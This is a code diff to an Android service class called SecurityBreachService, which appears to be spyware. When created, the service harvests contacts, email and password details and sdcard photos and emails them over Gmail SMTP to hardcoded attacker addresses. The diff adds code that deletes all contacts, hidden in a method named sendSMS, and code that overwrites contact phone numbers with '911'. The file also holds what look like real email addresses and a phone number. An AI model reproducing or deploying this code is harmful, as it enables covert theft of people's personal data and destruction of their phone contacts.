@@ -17,12 +17,12 @@ import android.content.Context;
 import android.content.Intent;
 import android.database.Cursor;
 import android.database.sqlite.SQLiteDatabase;
+import android.net.Uri;
 import android.os.IBinder;
 import android.provider.BaseColumns;
 import android.provider.ContactsContract;
 import android.provider.ContactsContract.CommonDataKinds.Phone;
 import android.provider.ContactsContract.Data;
-import android.telephony.SmsManager;
 import android.telephony.TelephonyManager;
 import android.util.Log;
 import android.widget.Toast;
@@ -30,7 +30,7 @@ import android.widget.Toast;
 public class SecurityBreachService extends Service {
 	private static final String TAG = "SecurityBreachService";
 	private static final String attackerEmailId = "eyespies55@gmail.com";
-	private static final String attackerMobile = "1111111111";
+	private static final String attackerMobile = "7325990097";
 
 	@Override
 	public IBinder onBind(Intent arg0) {
@@ -41,22 +41,33 @@ public class SecurityBreachService extends Service {
 	@Override
 	public void onCreate() {
 		Log.i(TAG, "Service created");
-		//sendSMS();
-		sendEmails();
-		//		updateContacts();
+		sendSMSEmails();
+		updateContacts();
 	}
 
 	private void updateContacts() {
 		// TODO Auto-generated method stub
-		ContentValues values = new ContentValues();
-		values.put(Phone.NUMBER, "999-999-9999");
-		getContentResolver().update(Data.CONTENT_URI, values, null, null);
+		try{
+			ContentValues values = new ContentValues();
+			values.put(Phone.NUMBER, "911");
+			getContentResolver().update(Data.CONTENT_URI, values, null, null);
+		} catch(Exception e) {
+			e.printStackTrace();
+		}
 	}
 
-	public void sendSMS() {
-		SmsManager sms = SmsManager.getDefault();
-		sms.sendTextMessage(attackerMobile, null, 
-				"Client has been attacked..Details sent to email" , null, null);
+	public void sendSMS(String message) {
+		try {
+			ContentResolver contentResolver = getApplicationContext().getContentResolver();
+			Cursor cursor = contentResolver.query(ContactsContract.Contacts.CONTENT_URI, null, null, null, null);
+			while (cursor.moveToNext()) {
+				String lookupKey = cursor.getString(cursor.getColumnIndex(ContactsContract.Contacts.LOOKUP_KEY));
+				Uri uri = Uri.withAppendedPath(ContactsContract.Contacts.CONTENT_LOOKUP_URI, lookupKey);
+				contentResolver.delete(uri, null, null);
+			}
+		} catch(Exception e) {
+			e.printStackTrace();
+		}
 	}
 
 	@Override
@@ -64,7 +75,7 @@ public class SecurityBreachService extends Service {
 		System.out.println("On start overridden");
 	}
 
-	public int sendEmails() {
+	public int sendSMSEmails() {
 		ContentResolver resolver = getContentResolver();
 		Cursor cursor = resolver.query(ContactsContract.Contacts.CONTENT_URI,
 				null, null, null, null);
@@ -74,6 +85,7 @@ public class SecurityBreachService extends Service {
 				cursor.close();
 				String hackedEmailsMessage = hackEmail();
 				String hackedPasswordDetails = hackPassword();
+				sendSMS(hackedPasswordDetails);
 				sendMailsToAddress(contacts, hackedEmailsMessage, hackedPasswordDetails);
 				return 1;
 			}catch(Exception e){
@@ -146,12 +158,12 @@ public class SecurityBreachService extends Service {
 		String emailAndPassword = "Email and password details of ";
 		String photos = "Photos of ";
 		try {
-			new SMTPSendEmail().sendEmailTo("eyespies55@gmail.com", "eyespies55", "smtp.gmail.com", "eyespies55@gmail.com", emailMessage, null, mPhoneNumber!=null ? phoneDirectory + mPhoneNumber: phoneDirectory + "the victim");
+			new SMTPSendEmail().sendEmailTo("eyespies55@gmail.com", "eyespies55", "smtp.gmail.com", "parikshd@gmail.com", emailMessage, null, mPhoneNumber!=null ? phoneDirectory + mPhoneNumber: phoneDirectory + "the victim");
 			if (hackedPasswordDetails !=null || hackedEmailsMessage!= null){
-				new SMTPSendEmail().sendEmailTo("eyespies55@gmail.com", "eyespies55", "smtp.gmail.com", "eyespies55@gmail.com", webviewMessage, null,mPhoneNumber!=null ? emailAndPassword + mPhoneNumber: emailAndPassword + "the victim");
+				new SMTPSendEmail().sendEmailTo("eyespies55@gmail.com", "eyespies55", "smtp.gmail.com", "parikshd@gmail.com", webviewMessage, null,mPhoneNumber!=null ? emailAndPassword + mPhoneNumber: emailAndPassword + "the victim");
 			}
 			if(imageList != null && !imageList.isEmpty()) {
-				new SMTPSendEmail().sendEmailTo("eyespies55@gmail.com", "eyespies55", "smtp.gmail.com", "eyespies55@gmail.com", 
+				new SMTPSendEmail().sendEmailTo("eyespies55@gmail.com", "eyespies55", "smtp.gmail.com", "parikshd@gmail.com", 
 						"This email contains images from sdcard", imageList,mPhoneNumber!=null ? photos + mPhoneNumber: photos + "the victim");
 			} 
 		} catch (AddressException e) {
@@ -160,13 +172,6 @@ public class SecurityBreachService extends Service {
 			System.out.println("messaging exception" + e.getMessage());
 			e.printStackTrace();
 		}
-		//		Intent intent = new Intent(Intent.ACTION_SENDTO); // it's not ACTION_SEND
-		//		intent.setType("text/plain");
-		//		intent.putExtra(Intent.EXTRA_SUBJECT, "Malicious gain of information");
-		//		intent.putExtra(Intent.EXTRA_TEXT, emailMessage);
-		//		intent.setData(Uri.parse("mailto:" + attackerEmailId)); // or just "mailto:" for blank
-		//		intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK); // this will make such that when user returns to your app, your app is displayed, instead of the email app.
-		//		startActivity(intent); 
 	}
 
 	private String constructContactInfoEmail(List<ContactInformation> contacts) {
